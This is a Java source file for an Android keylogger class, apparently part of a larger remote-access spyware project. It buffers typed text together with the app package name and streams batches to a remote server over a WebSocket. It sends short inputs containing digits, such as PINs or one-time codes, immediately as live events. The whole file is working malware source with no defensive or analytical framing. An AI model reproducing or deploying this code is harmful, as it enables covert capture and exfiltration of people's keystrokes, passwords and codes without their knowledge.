package com.xrc.system.features;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.network.WebSocketClient;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class Keylogger {
    private static final String TAG = Constants.TAG + ":Keylog";
    private static Keylogger instance;
    private final Context ctx;
    private final List<String> buffer;
    private boolean enabled = false;
    private final Object lock = new Object();

    private Keylogger(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.buffer = new ArrayList<>();
    }

    public static synchronized Keylogger get(Context ctx) {
        if (instance == null) {
            instance = new Keylogger(ctx);
        }
        return instance;
    }

    public void enable() {
        enabled = true;
        Log.i(TAG, "Keylogger enabled");
    }

    public void disable() {
        enabled = false;
        flushBuffer();
        Log.i(TAG, "Keylogger disabled");
    }

    public void logKey(String text, String packageName) {
        if (!enabled || text == null || text.isEmpty()) return;
        synchronized (lock) {
            String entry = System.currentTimeMillis() + "|" + packageName + "|" + text;
            buffer.add(entry);
            if (buffer.size() >= 50) {
                flushBuffer();
            }
        }
        // Immediate send for short sensitive inputs
        if (text.length() <= 8 && text.matches(".*\d.*")) {
            try {
                JSONObject data = new JSONObject();
                data.put("package", packageName);
                data.put("input", text);
                data.put("ts", System.currentTimeMillis());
                WebSocketClient.get(ctx).sendEvent("keylog_live", data);
            } catch (JSONException e) {
                Log.e(TAG, "Live keylog failed", e);
            }
        }
    }

    public void flushBuffer() {
        synchronized (lock) {
            if (buffer.isEmpty()) return;
            try {
                JSONObject data = new JSONObject();
                StringBuilder sb = new StringBuilder();
                for (String entry : buffer) {
                    if (sb.length() > 0) sb.append("\n");
                    sb.append(entry);
                }
                data.put("batch", sb.toString());
                data.put("count", buffer.size());
                WebSocketClient.get(ctx).sendEvent("keylog_batch", data);
                buffer.clear();
            } catch (JSONException e) {
                Log.e(TAG, "Buffer flush failed", e);
            }
        }
    }

    public void dumpAndSend() {
        flushBuffer();
        try {
            JSONObject data = new JSONObject();
            data.put("status", "dump_complete");
            WebSocketClient.get(ctx).sendEvent("keylog_dump", data);
        } catch (JSONException e) {
            Log.e(TAG, "Dump failed", e);
        }
    }

    public boolean isEnabled() {
        return enabled;
    }
}
